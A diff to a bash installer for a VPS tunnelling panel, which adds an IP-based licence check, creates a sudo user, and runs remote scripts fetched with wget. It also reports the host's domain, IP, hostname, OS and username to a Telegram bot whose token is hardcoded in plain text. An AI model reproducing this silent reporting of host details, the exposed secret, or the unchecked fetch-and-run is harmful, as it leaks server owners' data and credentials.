@@ -11,6 +11,44 @@ yellow() { echo -e "\\033[33;1m${*}\\033[0m"; }
 green() { echo -e "\\033[32;1m${*}\\033[0m"; }
 red() { echo -e "\\033[31;1m${*}\\033[0m"; }
 
+# USERNAME
+rm -f /usr/bin/user
+username=$(curl https://raw.githubusercontent.com/myzid/izin/main/ip | grep $MYIP | awk '{print $2}')
+echo "$username" >/usr/bin/user
+# validity
+rm -f /usr/bin/e
+valid=$(curl https://raw.githubusercontent.com/myzid/izin/main/ip | grep $MYIP | awk '{print $3}')
+echo "$valid" >/usr/bin/e
+# DETAIL ORDER
+username=$(cat /usr/bin/user)
+oid=$(cat /usr/bin/ver)
+exp=$(cat /usr/bin/e)
+clear
+# CERTIFICATE STATUS
+d1=$(date -d "$valid" +%s)
+d2=$(date -d "$today" +%s)
+certifacate=$(((d1 - d2) / 86400))
+# VPS Information
+DATE=$(date +'%Y-%m-%d')
+datediff() {
+    d1=$(date -d "$1" +%s)
+    d2=$(date -d "$2" +%s)
+    echo -e "$COLOR1 $NC Expiry In   : $(( (d1 - d2) / 86400 )) Days"
+}
+mai="datediff "$Exp" "$DATE""
+
+# Status Expired or Active
+Info="(${green}Active${NC})"
+Error="(${RED}ExpiRED${NC})"
+today=`date -d "0 days" +"%Y-%m-%d"`
+Exp1=$(curl https://raw.githubusercontent.com/myzid/izin/main/ip | grep $MYIP | awk '{print $3}')
+if [[ $today < $Exp1 ]]; then
+sts="${Info}"
+else
+sts="${Error}"
+fi
+clear
+
 # LINK REPO
 REPO="https://raw.githubusercontent.com/myzid/v6/main/"
 cd /root
@@ -38,6 +76,7 @@ echo "$localip $(hostname)" >> /etc/hosts
 fi
 mkdir -p /etc/xray
 mkdir -p /etc/v2ray
+mkdir -p /etc/log-create
 mkdir -p /var/lib/SIJA >/dev/null 2>&1
 touch /etc/xray/domain
 touch /etc/v2ray/domain
@@ -55,10 +94,6 @@ echo "Installation time : $(( ${1} / 3600 )) hours $(( (${1} / 60) % 60 )) minut
 }
 start=$(date +%s)
 ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
-sysctl -w net.ipv6.conf.all.disable_ipv6=1 
-sysctl -w net.ipv6.conf.default.disable_ipv6=1 
-apt update 
-apt install -y bzip2 gzip coreutils screen curl unzip
 sysctl -w net.ipv6.conf.all.disable_ipv6=1 >/dev/null 2>&1
 sysctl -w net.ipv6.conf.default.disable_ipv6=1 >/dev/null 2>&1
 apt update -y
@@ -80,21 +115,24 @@ sudo apt install -y screen curl jq bzip2 gzip coreutils rsyslog iftop \
  dropbear  libsqlite3-dev \
  socat cron bash-completion ntpdate xz-utils sudo apt-transport-https \
  gnupg2 dnsutils lsb-release chrony
+sudo apt install -y libnss3-dev libnspr4-dev pkg-config libpam0g-dev libcap-ng-dev libcap-ng-utils libselinux1-dev libcurl4-nss-dev flex bison make libnss3-tools libevent-dev xl2tpd pptpd
 
+apt -y install vnstat > /dev/null 2>&1
 /etc/init.d/vnstat restart
-wget -q https://humdi.net/vnstat/vnstat-2.6.tar.gz
+apt -y install libsqlite3-dev > /dev/null 2>&1
+wget https://humdi.net/vnstat/vnstat-2.6.tar.gz
 tar zxvf vnstat-2.6.tar.gz
 cd vnstat-2.6
-./configure --prefix=/usr --sysconfdir=/etc >/dev/null 2>&1 && make >/dev/null 2>&1 && make install >/dev/null 2>&1
+./configure --prefix=/usr --sysconfdir=/etc && make && make install
 cd
 vnstat -u -i $NET
 sed -i 's/Interface "'""eth0""'"/Interface "'""$NET""'"/g' /etc/vnstat.conf
 chown vnstat:vnstat /var/lib/vnstat -R
 systemctl enable vnstat
 /etc/init.d/vnstat restart
-rm -f /root/vnstat-2.6.tar.gz >/dev/null 2>&1
-rm -rf /root/vnstat-2.6 >/dev/null 2>&1
-sudo apt install -y libnss3-dev libnspr4-dev pkg-config libpam0g-dev libcap-ng-dev libcap-ng-utils libselinux1-dev libcurl4-nss-dev flex bison make libnss3-tools libevent-dev xl2tpd pptpd
+/etc/init.d/vnstat status
+rm -f /root/vnstat-2.6.tar.gz
+rm -rf /root/vnstat-2.6
 
 clear
 echo "IP=" >> /var/lib/SIJA/ipvps.conf
@@ -141,21 +179,35 @@ mkdir -p /home/script/
 useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
 echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
 usermod -aG sudo $Username > /dev/null 2>&1
+
+Ram_Usage="$((mem_used / 1024))"
+Ram_Total="$((mem_total / 1024))"
+tanggal=`date -d "0 days" +"%d-%m-%Y - %X" `
+OS_Name=$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/PRETTY_NAME//g' | sed 's/=//g' | sed 's/"//g' )
 CHATID="-1001899398362"
 KEY="6293396608:AAGqZVrmdQjPc3tOj_gnUoWOVMrBsm8v6Xo"
 TIME="10"
 URL="https://api.telegram.org/bot$KEY/sendMessage"
-TEXT="Installasi script v6 By Fvstores
-============================
-<code>Domain     :</code> <code>$domain</code>
-<code>IP Vps     :</code> <code>$(cat /root/.ip)</code>
-<code>User Script:</code> <code>$Name</code>
-<code>Exp Script :</code> <code>$Exp</code>
-<code>Location   :</code> <code>$CITY</code>
-<code>Timezone   :</code> <code>$WKT</code>
-============================
+TEXT="
+────────────────────────
+   ⚡ INSTALLASI SCRIPT ⚡
+────────────────────────
+Tanggal  : <code>$tanggal</code>
+Hostname : <code>${HOSTNAME}</code>
+Linux    : <code>$OS_Name</code>
+Ram Used : <code>$Ram_Total / $Ram_Usage MB</code>
+────────────────────────
+Domain   : <code>$domain</code>
+IP Vps   : <code>$(cat /root/.ip)</code>
+Username : <code>$username</code>
+Expired  : <code>$exp</code>
+────────────────────────
+<i>Nontifikasi Otomatis Dari Github</i>
+<i>Fv stores</i>
+'&reply_markup={"inline_keyboard":[[{"text":"⚡ ORDER ⚡","url":"https://t.me/×××"}]]}'
 "
-curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
+   curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
+
 clear
 echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
 echo -e "$green          Install SSH                $NC"
@@ -171,7 +223,7 @@ wget -q ${REPO}sshws/insshws.sh && chmod +x insshws.sh && ./insshws.sh
 clear
 echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
 echo -e "$green          Install BACKUP               $NC"
-echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
 echo
 wget -q ${REPO}backup/set-br.sh &&  chmod +x set-br.sh && ./set-br.sh
 clear
